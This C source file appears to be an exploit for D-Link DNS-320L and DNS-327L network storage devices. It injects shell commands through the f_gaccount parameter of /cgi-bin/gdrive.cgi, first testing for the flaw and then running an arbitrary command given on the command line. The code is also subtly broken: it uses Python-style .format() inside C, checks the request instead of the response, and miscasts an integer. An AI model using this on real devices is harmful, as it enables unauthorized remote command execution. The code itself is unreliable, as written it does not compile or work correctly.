// "D-Link DNS-320L 1.03b04, D-Link DNS-327L, 1.02

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define MAX_RESPONSE_SIZE 8192
#define TARGET_PORT 80

int create_http_request(const char *target_ip, const char *path, char *request, size_t request_size) {
    snprintf(request, request_size,
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n\r\n",
             path, target_ip);
    return 0;
}

int send_http_request(const char *target_ip, const char *path) {
    int sock;
    struct sockaddr_in server_addr;
    char request[1024];
    char response[MAX_RESPONSE_SIZE];
    int bytes_received;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    create_http_request(target_ip, path, request, sizeof(request));
    send(sock, request, strlen(request), 0);

    memset(response, 0, sizeof(response));
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return -1;
    }

    response[bytes_received] = '\0'; // Null-terminate the response
    return bytes_received;
}

int check_vulnerability(const char *target_ip) {
    char path[256];
    int number = rand() % 1000000; // Random number for the check
    int solution = number - 1;

    snprintf(path, sizeof(path),
             "/cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;echo $((%d-1));echo ffffffffffffffff;", number);

    int bytes_received = send_http_request(target_ip, path);
    if (bytes_received < 0) return 0; // Target is not vulnerable

    // Check if the response contains the solution
    if (strstr(path, "200 OK") && strstr(path, (char *)&solution)) {
        return 1; // Target is vulnerable
    }

    return 0; // Target is not vulnerable
}

void execute_command(const char *target_ip, const char *cmd) {
    char path[256];
    char mark[32];
    snprintf(mark, sizeof(mark), "%d", rand()); // Generate a random mark

    snprintf(path, sizeof(path),
             "/cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;{};echo {};".format(cmd, mark));

    send_http_request(target_ip, path);
}

int main(int argc, char *argv[]) {
    const char *target_ip = argv[1]; // Target IP from command line argument
    const char *cmd = argv[2]; // Command to execute from command line argument

    check_vulnerability(target_ip); // Check if the target is vulnerable
    execute_command(target_ip, cmd); // Execute the command

    return 0;
}
